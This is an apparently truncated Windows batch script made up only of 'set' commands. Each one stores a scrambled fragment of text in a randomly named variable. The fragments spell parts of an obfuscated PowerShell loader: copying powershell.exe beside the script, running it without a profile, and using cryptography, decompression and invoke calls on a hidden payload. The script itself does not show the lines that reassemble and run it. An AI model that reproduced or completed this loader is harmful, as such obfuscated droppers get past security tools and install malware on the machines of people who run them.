@echo off
set "lRxhaTsLhr=co"
set "flWYPmWHnM=he"
set "zohVrgASgi=rS"
set "hTXVEtedCO=nd"
set "jPjJMeJznK=ow"
set "qXLAWtMGVt=y "
set "TpnvlqbAZg=he"
set "VHqtJJpsOI=ws"
set "mGYWwUWDPo=rs"
set "szCHzRoveo=.e"
set "ySNuElKDBy= C"
set "LEYIDFImBF=ll"
set "rbQQzsvrPF= /"
set "JdKAMjcesT=xe"
set "LwsgrlIjOY=Wi"
set "idCbGUpzsL=0\"
set "UyajlIaGsa=32"
set "lTlHgREZSo=ll"
set "DsciLStbnF=1."
set "EwLrkUfQtU=py"
set "CRTDpnEGCn=\W"
set "yVByPdljrQ=Po"
set "FzNldzSbzz=:\"
set "cdrTjbzGdt=s\"
set "epZdSeLQNs=we"
set "yqzDjsCQWK=we"
set "BiWdWdCeLD=em"
set "DAODrLCSGJ=Sy"
set "YzFwjjOFhJ=\v"
set "vOzKqWnIum=st"
set "ixgcPXOqzH=do"
set "ynrBjFGAPG=po"
set "NQmQSuEKGo=in"
set "AMIhvEGXHv= %~dp0"
set "qHhmLDrQXM=cd"
set "PIKHnDAkOS=Syst"
set "aMXJwHJcGS=se()"
set "ErjrBaSDid=S46e"
set "rrMvmkRpKY=$lpq"
set "ljbyIbLCNZ=$pPD"
set "tdUgsnmGxL=.Com"
set "gOxQtMdjZr=Y = "
set "PUCOSqORTj=tion"
set "hnmrdyaMYa=fore"
set "VwMTzlAAjm=1..-"
set "yffwKrQiOV=);$r"
set "ZnKRKYBfBC=y.Ci"
set "nVepMWsvGt=m.IO"
set "hiNXYovFfy=am;$"
set "VhrDxKITVQ=y]::"
set "AIEqUhJIQk=rofi"
set "LQCkCMWzRk= [Sy"
set "yiBrCELSsO=C.Su"
set "vVlIZmaEOM=pStr"
set "NNtwjFqlqS=$rqj"
set "HjYEIOCMxb=ZGC "
set "ZdxbaXeGoN=trea"
set "iKGqLjFUqE=7;$F"
set "ThjfEgxVuT=.Dis"
set "oZdLGwFPAr=ach "
set "vdpiMCHnyo='')("
set "HdgZYwoJKU=OyzA"
set "OfKbSonEgZ=slpm"
set "nBMGfQqXLk= '')"
set "gJFFvEhycy=mory"
set "IsrTItUIbj=in $"
set "HLixmuDalW=e]::"
set "JItIAlBTsy=-nop"
set "pOjCMHccEY=sion"
set "oNzSmciRQF=lpqM"
set "qMYWRvzXRG=File"
set "BouEybCGJI=.Len"
set "nlCREkURKK=m.IO"
set "JwqcSUHggc=uG ="
set "gwtsFFrGAd=comp"
set "bYXlcAUjBN=nage"
set "VJMfoPxcTa=-1.."
set "HUQOXJgVPN=isfL"
set "xGKwBouKlz=[-1."
set "McljQzVWcb='txe"
set "TjsSAFjbpD=em.I"
set "RvuwMpraDs=lBlo"
set "QSTBYNCJpr=Disp"
set "fPEmMcVoQC=Conv"
set "MpfMIzZOXf=();$"
set "gZoUPyZMxG=ispo"
set "KjvhUoXQGE=em.C"
set "AUNPJhPPFj=.Key"
set "nAaCNjDMxV=ehAy"
set "cWMVwmTjvk=736u"
set "qJunOYllxn=ode]"
set "gPWOxpDcBQ=Invo"
set "ZbCLveFLzK=t Sy"
set "XNMmnBdKBt=CvL "
set "NukzdQBZWJ=form"
set "XaseZXTeYC=and "
set "bKzdUmhPnS=);$n"
set "svdaWnwotP=esMa"
set "YnlHebFRCs=VgTG"
set "cOTDnsSCyQ=urit"
set "kZrWKqBdTi=tS46"
set "QErGKtPqov=]::C"
set "YSahVejrNP=v4Ir"
set "LMuJfuCADA=op, "
